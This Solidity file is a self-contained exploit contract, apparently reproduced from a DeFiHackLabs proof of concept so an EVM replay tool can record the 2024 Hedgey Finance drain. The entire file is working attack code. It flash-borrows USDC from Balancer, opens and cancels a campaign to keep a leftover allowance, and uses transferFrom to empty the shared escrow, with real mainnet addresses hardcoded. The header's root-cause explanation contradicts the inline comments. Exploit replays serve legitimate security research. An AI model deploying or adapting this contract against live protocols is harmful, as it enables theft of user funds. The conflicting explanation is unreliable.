// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-04-HedgeyFinance).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// Balancer flash-loan callback `receiveFlashLoan` lives on the test itself, and
// `address(this)` acts as the campaign manager/token locker), so there is no
// standalone contract to deploy. This contract is a faithful, self-contained copy
// of that inline attack (testExploit + receiveFlashLoan) so the playground can
// deploy it and record attack(). Logic and constants are copied verbatim from
// test/HedgeyFinance_exp.sol.
//
// Root cause: Hedgey Finance's ClaimCampaigns.cancelCampaign() refunds the
// campaign's un-vested/un-claimed token balance to the campaign `manager` by
// pulling `IERC20(token).transferFrom(campaign.manager, ...)`-adjacent internal
// bookkeeping that trusts the campaign's recorded `amount`/token balance instead
// of re-validating what the campaign actually holds. By flash-borrowing USDC,
// creating a campaign that "donates" a large ERC20 allowance from the attacker
// contract, then immediately cancelling it, the attacker/manager receives a
// refund based on the campaign's stale bookkeeping rather than assets it truly
// deposited, allowing it to drain HedgeyFinance's entire USDC balance via
// transferFrom.

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

enum TokenLockup {
    Unlocked,
    Locked,
    Vesting
}

struct Campaign {
    address manager;
    address token;
    uint256 amount;
    uint256 end;
    TokenLockup tokenLockup;
    bytes32 root;
}

struct Donation {
    address tokenLocker;
    uint256 amount;
    uint256 rate;
    uint256 start;
    uint256 cliff;
    uint256 period;
}

struct ClaimLockup {
    address tokenLocker;
    uint256 start;
    uint256 cliff;
    uint256 period;
    uint256 periods;
}

interface IClaimCampaigns {
    function createLockedCampaign(
        bytes16 id,
        Campaign memory campaign,
        ClaimLockup memory claimLockup,
        Donation memory donation
    ) external;

    function cancelCampaign(bytes16 campaignId) external;
}

contract HedgeyDrain {
    IBalancerVault private constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IClaimCampaigns private constant HEDGEY_FINANCE = IClaimCampaigns(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511);

    uint256 private constant LOAN = 1_305_000 * 1e6;

    // step 0: flash-borrow USDC from Balancer; the callback opens+cancels a
    // throwaway campaign that leaves a dangling allowance for this contract.
    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = LOAN;

        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, "");

        // step 3: the bug — cancelCampaign() refunded the deposit but never
        // revoked the allowance granted to `claimLockup.tokenLocker` (this
        // contract). Exercise that still-live allowance to pull EVERY other
        // project's USDC sitting in the shared ClaimCampaigns escrow.
        uint256 escrowBalance = USDC.balanceOf(address(HEDGEY_FINANCE));
        USDC.transferFrom(address(HEDGEY_FINANCE), msg.sender, escrowBalance);
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external payable {
        // step 1: open a locked campaign, approving Hedgey to pull the borrowed
        // USDC as the campaign's funding. `claimLockup.tokenLocker` is set to
        // THIS CONTRACT (fully attacker-controlled, only zero-checked by
        // Hedgey) instead of Hedgey's real lockup-plans contract — this is
        // what grants this contract the dangling allowance below.
        USDC.approve(address(HEDGEY_FINANCE), LOAN);

        bytes16 campaignId = 0x00000000000000000000000000000001;

        Campaign memory campaign;
        campaign.manager = address(this);
        campaign.token = address(USDC);
        campaign.amount = LOAN;
        campaign.end = 3_133_666_800;
        campaign.tokenLockup = TokenLockup.Locked;
        campaign.root = "";

        ClaimLockup memory claimLockup;
        claimLockup.tokenLocker = address(this);
        claimLockup.start = 0;
        claimLockup.cliff = 0;
        claimLockup.period = 0;
        claimLockup.periods = 0;

        Donation memory donation;
        donation.tokenLocker = address(this);
        donation.amount = 0;
        donation.rate = 0;
        donation.start = 0;
        donation.cliff = 0;
        donation.period = 0;

        HEDGEY_FINANCE.createLockedCampaign(campaignId, campaign, claimLockup, donation);

        // step 2: cancel immediately — this refunds our deposit but (the bug)
        // never revokes the allowance createLockedCampaign granted above, so
        // this contract keeps a free-floating transferFrom right over the
        // ENTIRE shared escrow balance after this call returns.
        HEDGEY_FINANCE.cancelCampaign(campaignId);

        // repay the Balancer flash loan (0 fee at the time of the attack) out
        // of the refunded deposit.
        USDC.transfer(address(BALANCER_VAULT), LOAN);
    }
}
